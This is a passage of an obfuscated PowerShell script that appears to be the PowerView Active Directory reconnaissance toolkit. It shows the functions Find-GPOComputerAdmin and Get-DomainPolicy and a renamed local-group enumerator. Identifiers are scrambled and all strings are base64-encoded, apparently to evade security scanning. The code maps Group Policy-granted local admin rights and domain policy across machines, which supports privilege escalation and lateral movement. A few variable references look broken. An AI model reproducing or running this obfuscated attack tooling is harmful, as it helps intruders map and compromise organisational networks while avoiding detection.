        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEcAcgBvAHUAcAAgAG0AdQBzAHQAIABiAGUAIAAnAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAnACwAIAAnAFIARABQACcALAAgAG8AcgAgAGEAIAAnAFMALQAxAC0ANQAtAFgAJwAgAFMASQBEACAAZgBvAHIAbQBhAHQALgA=')))
    }
    if(${_/\/===\/\/=\__/=}[0] -and (${_/\/===\/\/=\__/=}[0] -ne '*')) {
        ${_/\/===\/\/=\__/=} += _____/\/===\/=\/== -Domain $Domain -DomainController $DomainController -PageSize $PageSize -UserName ${_/=\__/==\/\_/\/=} -_/====\/=\/==\_/\_
    }
    if(-not ${_/\/===\/\/=\__/=}) {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAZQBmAGYAZQBjAHQAaQB2AGUAIAB0AGEAcgBnAGUAdAAgAFMASQBEAHMAIQA=')))
    }
    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATABvAGMAYQBsAFMASQBEADoAIAAkAHsAXwBfAC8AXAAvAFwAXwAvAD0APQBcAC8APQA9AFwALwBcAH0A')))
    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBmAGYAZQBjAHQAaQB2AGUAIAB0AGEAcgBnAGUAdAAgAFMASQBEAHMAOgAgACQAewBfAC8AXAAvAD0APQA9AFwALwBcAC8APQBcAF8AXwAvAD0AfQA=')))
    ${____/=\/\/\/===\/} =  @{
        'Domain' = $Domain
        'DomainController' = $DomainController
        'UsePSDrive' = $UsePSDrive
        'ResolveMemberSIDs' = $True
        'PageSize' = $PageSize
    }
    ${/=\/\/\_/\/\__/=\} = ___/\/\/\/=\__/==\ @____/=\/\/\/===\/ | % {
        ${___/\_/\_/\___/\/} = $_
        if(${___/\_/\_/\___/\/}.GroupSID -match ${__/\/\_/==\/==\/\}) {
            ${___/\_/\_/\___/\/}.GroupMembers | ? {$_} | % {
                if ( (${_/\/===\/\/=\__/=}[0] -eq '*') -or (${_/\/===\/\/=\__/=} -Contains $_) ) {
                    ${___/\_/\_/\___/\/}
                }
            }
        }
        if( (${___/\_/\_/\___/\/}.GroupMemberOf -contains ${__/\/\_/==\/==\/\}) ) {
            if( (${_/\/===\/\/=\__/=}[0] -eq '*') -or (${_/\/===\/\/=\__/=} -Contains ${___/\_/\_/\___/\/}.GroupSID) ) {
                ${___/\_/\_/\___/\/}
            }
        }
    } | sort -Property GPOName -Unique
    ${/=\/\/\_/\/\__/=\} | % {
        $GPOname = $_.GPODisplayName
        ${/==\/\/\_____/==\} = $_.GPOName
        ${/===\_______/\_/=} = $_.GPOPath
        ${__/\__/\__/==\___} = $_.GPOType
        if($_.GroupMembers) {
            ${/==\__/\/=\/===\/} = $_.GroupMembers
        }
        else {
            ${/==\__/\/=\/===\/} = $_.GroupSID
        }
        ${_/\/\__/\___/\__/} = $_.Filters
        if(-not ${__/=\_____/=\__/\}) {
            ${_/=\/===\/\/==\/\} = ${/==\__/\/=\/===\/}
        }
        else {
            ${_/=\/===\/\/==\/\} = ${__/=\_____/=\__/\}
        }
        __/\/=\_/=\/==\/\_ -Domain $Domain -DomainController $DomainController -__/\__/\______/\__ ${/==\/\/\_____/==\} -FullData -PageSize $PageSize | % {
            if(${_/\/\__/\___/\__/}) {
                ${___/=\/\/=\_/\___} = _/=\___/=\_______/ -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $_.ADSpath -FullData -PageSize $PageSize | ? {
                    $_.adspath -match (${_/\/\__/\___/\__/}.Value)
                } | % { $_.dnshostname }
            }
            else {
                ${___/=\/\/=\_/\___} = _/=\___/=\_______/ -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $_.ADSpath -PageSize $PageSize
            }
            if(${___/=\/\/=\_/\___}) {
                if(${___/=\/\/=\_/\___} -isnot [System.Array]) {${___/=\/\/=\_/\___} = @(${___/=\/\/=\_/\___})}
                ForEach (${___/===\_/====\__} in ${_/=\/===\/\/==\/\}) {
                    ${_/=====\/=\___/==\} = ___/\/\/\/\/==\/\_ -__/\/=\/\_/\/====\ ${___/===\_/====\__} -Domain $Domain -DomainController $DomainController -Credential $Credential -PageSize $PageSize
                    ${/=\/=\/\/=\/=====} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -contains ${_/=====\/=\___/==\}.samaccounttype
                    ${_/=\/=\___/\/=\/=} = New-Object PSObject
                    ${_/=\/=\___/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) ${_/=====\/=\___/==\}.samaccountname
                    ${_/=\/=\___/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) ${_/=====\/=\___/==\}.distinguishedname
                    ${_/=\/=\___/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) ${_/=====\/=\___/==\}.objectsid
                    ${_/=\/=\___/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))) $Domain
                    ${_/=\/=\___/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${/=\/=\/\/=\/=====}
                    ${_/=\/=\___/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) $GPOname
                    ${_/=\/=\___/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARwB1AGkAZAA='))) ${/==\/\/\_____/==\}
                    ${_/=\/=\___/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) ${/===\_______/\_/=}
                    ${_/=\/=\___/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) ${__/\__/\__/==\___}
                    ${_/=\/=\___/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABhAGkAbgBlAHIATgBhAG0AZQA='))) $_.distinguishedname
                    ${_/=\/=\___/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${___/=\/\/=\_/\___}
                    ${_/=\/=\___/\/=\/=}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBMAG8AYwBhAGwARwByAG8AdQBwAA=='))))
                    ${_/=\/=\___/\/=\/=}
                }
            }
        }
        _/==\_/===\____/== -Domain $Domain -DomainController $DomainController -__/\__/\______/\__ ${/==\/\/\_____/==\} -PageSize $PageSize -FullData | % {
            ForEach (${___/===\_/====\__} in ${_/=\/===\/\/==\/\}) {
                ${_/=====\/=\___/==\} = ___/\/\/\/\/==\/\_ -__/\/=\/\_/\/====\ ${___/===\_/====\__} -Domain $Domain -DomainController $DomainController -Credential $Credential -PageSize $PageSize
                ${/=\/=\/\/=\/=====} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -contains ${_/=====\/=\___/==\}.samaccounttype
                ${__/=\_/=\/\/===\/} = New-Object PSObject
                ${__/=\_/=\/\/===\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) ${_/=====\/=\___/==\}.samaccountname
                ${__/=\_/=\/\/===\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) ${_/=====\/=\___/==\}.distinguishedname
                ${__/=\_/=\/\/===\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) ${_/=====\/=\___/==\}.objectsid
                ${__/=\_/=\/\/===\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${/=\/=\/\/=\/=====}
                ${__/=\_/=\/\/===\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))) $Domain
                ${__/=\_/=\/\/===\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) $GPOname
                ${__/=\_/=\/\/===\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARwB1AGkAZAA='))) ${/==\/\/\_____/==\}
                ${__/=\_/=\/\/===\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) ${/===\_______/\_/=}
                ${__/=\_/=\/\/===\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) ${__/\__/\__/==\___}
                ${__/=\_/=\/\/===\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABhAGkAbgBlAHIATgBhAG0AZQA='))) $_.distinguishedname
                ${__/=\_/=\/\/===\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $_.siteobjectbl
                ${__/=\_/=\/\/===\/}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBMAG8AYwBhAGwARwByAG8AdQBwAA=='))))
                ${__/=\_/=\/\/===\/}
            }
        }
    }
}
function Find-GPOComputerAdmin {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $ComputerName,
        [String]
        $OUName,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $Recurse,
        [String]
        $LocalGroup = 'Administrators',
        [Switch]
        $UsePSDrive,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    process {
        if(!$ComputerName -and !$OUName) {
            Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAG8AcgAgAC0ATwBVAE4AYQBtAGUAIABtAHUAcwB0ACAAYgBlACAAcAByAG8AdgBpAGQAZQBkAA==')))
        }
        ${/=\/\/\_/\/\__/=\} = @()
        if($ComputerName) {
            ${____/=\/\/==\/==\} = _/=\___/=\_______/ -ComputerName $ComputerName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize
            if(!${____/=\/\/==\/==\}) {
                throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByACAAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAGkAbgAgAGQAbwBtAGEAaQBuACAAJwAkAEQAbwBtAGEAaQBuACcAIABuAG8AdAAgAGYAbwB1AG4AZAAhACAAVAByAHkAIABhACAAZgB1AGwAbAB5ACAAcQB1AGEAbABpAGYAaQBlAGQAIABoAG8AcwB0ACAAbgBhAG0AZQA=')))
            }
            ${_____/==\/\/\_/\_} = @()
            ForEach(${___/==\/\/==\/=\/} in ${____/=\/\/==\/==\}) {
                ${/==\/\/\/=\/\___/} = ${___/==\/\/==\/=\/}.distinguishedname
                ${_____/==\/\/\_/\_} += ${/==\/\/\/=\/\___/}.split(",") | % {
                    if($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBVAD0A'))))) {
                        ${/==\/\/\/=\/\___/}.substring(${/==\/\/\/=\/\___/}.indexof($_))
                    }
                }
            }
            ${/=\____/====\/\__} = (_/==\__/\_/==\_/\_ -ComputerName $ComputerName).SiteName
            if(${/=\____/====\/\__} -and (${/=\____/====\/\__} -notlike $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACoA'))))) {
                ${/=\/\/\_/\/\__/=\} += _/==\_/===\____/== -SiteName ${/=\____/====\/\__} -FullData | % {
                    if($_.gplink) {
                        $_.gplink.split("][") | % {
                            if ($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                                $_.split(";")[0]
                            }
                        }
                    }
                } | % {
                    ${____/=\/\/\/===\/} =  @{
                        'Domain' = $Domain
                        'DomainController' = $DomainController
                        'ResolveMemberSIDs' = $True
                        'UsePSDrive' = $UsePSDrive
                        'PageSize' = $PageSize
                    }
                    ___/\/\/\/=\__/==\ @____/=\/\/\/===\/
                }
            }
        }
        else {
            ${_____/==\/\/\_/\_} = @($OUName)
        }
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAIABPAFUAcwA6ACAAJAB7AF8AXwBfAF8AXwAvAD0APQBcAC8AXAAvAFwAXwAvAFwAXwB9AA==')))
        ${_____/==\/\/\_/\_} | ? {$_} | % {
            ${/========\/======} = __/\/=\_/=\/==\/\_ -Domain $Domain -DomainController $DomainController -ADSpath $_ -FullData -PageSize $PageSize | % { 
                if($_.gplink) {
                    $_.gplink.split("][") | % {
                        if ($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                            $_.split(";")[0]
                        }
                    }
                }
            }
            ${____/=\/\/\/===\/} =  @{
                'Domain' = $Domain
                'DomainController' = $DomainController
                'UsePSDrive' = $UsePSDrive
                'ResolveMemberSIDs' = $True
                'PageSize' = $PageSize
            }
            ${/=\/\/\_/\/\__/=\} += ___/\/\/\/=\__/==\ @____/=\/\/\/===\/ | % {
                ForEach(${___/\__/==\_/\/==} in ${/========\/======}) {
                    $Name = $_.GPOName
                    if(${___/\__/==\_/\/==} -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAkAE4AYQBtAGUAKgA=')))) {
                        $_
                    }
                }
            }
        }
        ${/=\/\/\_/\/\__/=\} | sort -Property GPOName -Unique | % {
            ${___/\_/\_/\___/\/} = $_
            if(${___/\_/\_/\___/\/}.GroupMembers) {
                ${/==\__/\/=\/===\/} = ${___/\_/\_/\___/\/}.GroupMembers
            }
            else {
                ${/==\__/\/=\/===\/} = ${___/\_/\_/\___/\/}.GroupSID
            }
            ${/==\__/\/=\/===\/} | % {
                ${_/=====\/=\___/==\} = ___/\/\/\/\/==\/\_ -Domain $Domain -DomainController $DomainController -PageSize $PageSize -__/\/=\/\_/\/====\ $_
                ${/=\/=\/\/=\/=====} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -contains ${_/=====\/=\___/==\}.samaccounttype
                ${_/==\/\_/\/\/\_/=} = New-Object PSObject
                ${_/==\/\_/\/\/\_/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $ComputerName
                ${_/==\/\_/\/\/\_/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) ${_/=====\/=\___/==\}.samaccountname
                ${_/==\/\_/\/\/\_/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) ${_/=====\/=\___/==\}.distinguishedname
                ${_/==\/\_/\/\/\_/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) $_
                ${_/==\/\_/\/\/\_/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${/=\/=\/\/=\/=====}
                ${_/==\/\_/\/\/\_/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) ${___/\_/\_/\___/\/}.GPODisplayName
                ${_/==\/\_/\/\/\_/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARwB1AGkAZAA='))) ${___/\_/\_/\___/\/}.GPOName
                ${_/==\/\_/\/\/\_/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) ${___/\_/\_/\___/\/}.GPOPath
                ${_/==\/\_/\/\/\_/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) ${___/\_/\_/\___/\/}.GPOType
                ${_/==\/\_/\/\/\_/=}
                if($Recurse -and ${_/==\/\_/\/\/\_/=}.isGroup) {
                    _/\____/=\__/\/\/\ -Domain $Domain -DomainController $DomainController -__/\/=\/\_/\/====\ $_ -FullData -Recurse -PageSize $PageSize | % {
                        ${_/=====\_/\__/=\_} = $_.distinguishedName
                        ${_/====\/\_/\/==\_} = ${_/=====\_/\__/=\_}.subString(${_/=====\_/\__/=\_}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        ${_/\__/====\_/\__/} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -contains $_.samaccounttype
                        if ($_.samAccountName) {
                            ${__/\_____/\____/=} = $_.samAccountName
                        }
                        else {
                            try {
                                ${__/\_____/\____/=} = __/\_/\_/\__/\/\/\ $_.cn
                            }
                            catch {
                                ${__/\_____/\____/=} = $_.cn
                            }
                        }
                        ${_/==\/\_/\/\/\_/=} = New-Object PSObject
                        ${_/==\/\_/\/\/\_/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $ComputerName
                        ${_/==\/\_/\/\/\_/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) ${__/\_____/\____/=}
                        ${_/==\/\_/\/\/\_/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) ${_/=====\_/\__/=\_}
                        ${_/==\/\_/\/\/\_/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) $_.objectsid
                        ${_/==\/\_/\/\/\_/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) $MemberIsGrou
                        ${_/==\/\_/\/\/\_/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) ${___/\_/\_/\___/\/}.GPODisplayName
                        ${_/==\/\_/\/\/\_/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARwB1AGkAZAA='))) ${___/\_/\_/\___/\/}.GPOName
                        ${_/==\/\_/\/\/\_/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) ${___/\_/\_/\___/\/}.GPOPath
                        ${_/==\/\_/\/\/\_/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) $GPOTypep
                        ${_/==\/\_/\/\/\_/=} 
                    }
                }
            }
        }
    }
}
function Get-DomainPolicy {
    [CmdletBinding()]
    Param (
        [String]
        [ValidateSet("Domain","DC")]
        $Source ="Domain",
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $ResolveSids,
        [Switch]
        $UsePSDrive
    )
    if($Source -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))) {
        ${_/=\/\/==========} = ___/\/==\_____/\__ -Domain $Domain -DomainController $DomainController -GPOname $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAzADEAQgAyAEYAMwA0ADAALQAwADEANgBEAC0AMQAxAEQAMgAtADkANAA1AEYALQAwADAAQwAwADQARgBCADkAOAA0AEYAOQB9AA==')))
        if(${_/=\/\/==========}) {
            ${___/===\_/\_/==\__} = ${_/=\/\/==========}.gpcfilesyspath + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAEEAQwBIAEkATgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAUwBlAGMARQBkAGkAdABcAEcAcAB0AFQAbQBwAGwALgBpAG4AZgA=')))
            ${_/=\__/==\_/\___/} =  @{
                'GptTmplPath' = ${___/===\_/\_/==\__}
                'UsePSDrive' = $UsePSDrive
            }
            __/====\/====\/=\/ @_/=\__/==\_/\___/
        }
    }
    elseif($Source -eq "DC") {
        ${_/=\/\/==========} = ___/\/==\_____/\__ -Domain $Domain -DomainController $DomainController -GPOname $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewA2AEEAQwAxADcAOAA2AEMALQAwADEANgBGAC0AMQAxAEQAMgAtADkANAA1AEYALQAwADAAQwAwADQARgBCADkAOAA0AEYAOQB9AA==')))
        if(${_/=\/\/==========}) {
            ${___/===\_/\_/==\__} = ${_/=\/\/==========}.gpcfilesyspath + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAEEAQwBIAEkATgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAUwBlAGMARQBkAGkAdABcAEcAcAB0AFQAbQBwAGwALgBpAG4AZgA=')))
            ${_/=\__/==\_/\___/} =  @{
                'GptTmplPath' = ${___/===\_/\_/==\__}
                'UsePSDrive' = $UsePSDrive
            }
            __/====\/====\/=\/ @_/=\__/==\_/\___/ | % {
                if($ResolveSids) {
                    ${/=\_/=\/===\/\/\_} = New-Object PSObject
                    $_.psobject.properties | % {
                        if( $_.Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAUgBpAGcAaAB0AHMA')))) {
                            ${__/\___/\/\/\__/\} = New-Object PSObject
                            $_.Value.psobject.properties | % {
                                ${/==\_/\____/\/==\} = $_.Value | % {
                                    try {
                                        if($_ -isnot [System.Array]) { 
                                            __/\_/\_/\__/\/\/\ $_ 
                                        }
                                        else {
                                            $_ | % { __/\_/\_/\__/\/\/\ $_ }
                                        }
                                    }
                                    catch {
                                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAcgBlAHMAbwBsAHYAaQBuAGcAIABTAEkARAAgADoAIAAkAF8A')))
                                    }
                                }
                                ${__/\___/\/\/\__/\} | Add-Member Noteproperty $_.Name ${/==\_/\____/\/==\}
                            }
                            ${/=\_/=\/===\/\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAUgBpAGcAaAB0AHMA'))) ${__/\___/\/\/\__/\}
                        }
                        else {
                            ${/=\_/=\/===\/\/\_} | Add-Member Noteproperty $_.Name $_.Value
                        }
                    }
                    ${/=\_/=\/===\/\/\_}
                }
                else { $_ }
            }
        }
    }
}
function __/\_/\/\_/\_/=\/\ {
    [CmdletBinding(DefaultParameterSetName = 'WinNT')]
    param(
        [Parameter(ParameterSetName = 'API', Position=0, ValueFromPipeline=$True)]
        [Parameter(ParameterSetName = 'WinNT', Position=0, ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String[]]
        $ComputerName = $Env:ComputerName,
        [Parameter(ParameterSetName = 'WinNT')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [Parameter(ParameterSetName = 'WinNT')]
        [Parameter(ParameterSetName = 'API')]
        [String]
        $GroupName = 'Administrators',
        [Parameter(ParameterSetName = 'WinNT')]
        [Switch]
        ${_/===\/\/\/\____/=},
        [Parameter(ParameterSetName = 'WinNT')]
        [Switch]
        $Recurse,
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API
    )
    process {
        ${__/\_/==\/==\_/\_} = @()
        if($ComputerFile) {
            ${__/\_/==\/==\_/\_} = gc -Path $ComputerFile
        }
        else {
            ${__/\_/==\/==\_/\_} += $ComputerName | _/=\_/=\/=\_/\__/\
        }
        ForEach(${/====\/\/\_____/\} in ${__/\_/==\/==\_/\_}) {
            if($API) {
                ${_/\/\____/\/=\___} = 2
                ${___/\/\/\_/\__/=\} = [IntPtr]::Zero
                ${____/\/=\/==\___/} = 0
                ${/===\___/=\/\/===} = 0
                ${/=\_/=====\/=\/=\} = 0
                ${__/\/\_/\___/=\__} = ${/=\/====\_/\/===\}::NetLocalGroupGetMembers(${/====\/\/\_____/\}, $GroupName, ${_/\/\____/\/=\___}, [ref]${___/\/\/\_/\__/=\}, -1, [ref]${____/\/=\/==\___/}, [ref]${/===\___/=\/\/===}, [ref]${/=\_/=====\/=\/=\})
                ${___/\____/====\/=\} = ${___/\/\/\_/\__/=\}.ToInt64()
                ${_/==\/===\___/\__} = @()
                if ((${__/\/\_/\___/=\__} -eq 0) -and (${___/\____/====\/=\} -gt 0)) {
                    ${/=\_/=\_/\/=\_/\/} = ${/===\__/\_/\/\_/\}::GetSize()
                    for (${__/==\/=\_/=\/==\} = 0; (${__/==\/=\_/=\/==\} -lt ${____/\/=\/==\___/}); ${__/==\/=\_/=\/==\}++) {
                        ${_/====\__/\__/\/\} = New-Object System.Intptr -ArgumentList ${___/\____/====\/=\}
                        ${___/=\_/==\_/\__/} = ${_/====\__/\__/\/\} -as ${/===\__/\_/\/\_/\}
                        ${___/\____/====\/=\} = ${_/====\__/\__/\/\}.ToInt64()
                        ${___/\____/====\/=\} += ${/=\_/=\_/\/=\_/\/}
                        ${___/====\___/\___} = ""
                        ${/\_______/\/==\__} = ${__/==\__/\_/\/\/=}::ConvertSidToStringSid(${___/=\_/==\_/\__/}.lgrmi2_sid, [ref]${___/====\___/\___});${____/\/\/=\/\_/\/} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if(${/\_______/\/==\__} -eq 0) {
                            Write-Verbose "Error: $(([ComponentModel.Win32Exception] ${____/\/\/=\/\_/\/}).Message)"
                        }
                        else {
                            ${/=\__/=\___/=\/\/} = New-Object PSObject
                            ${/=\__/=\___/=\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${/====\/\/\_____/\}
                            ${/=\__/=\___/=\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) ${___/=\_/==\_/\__/}.lgrmi2_domainandname
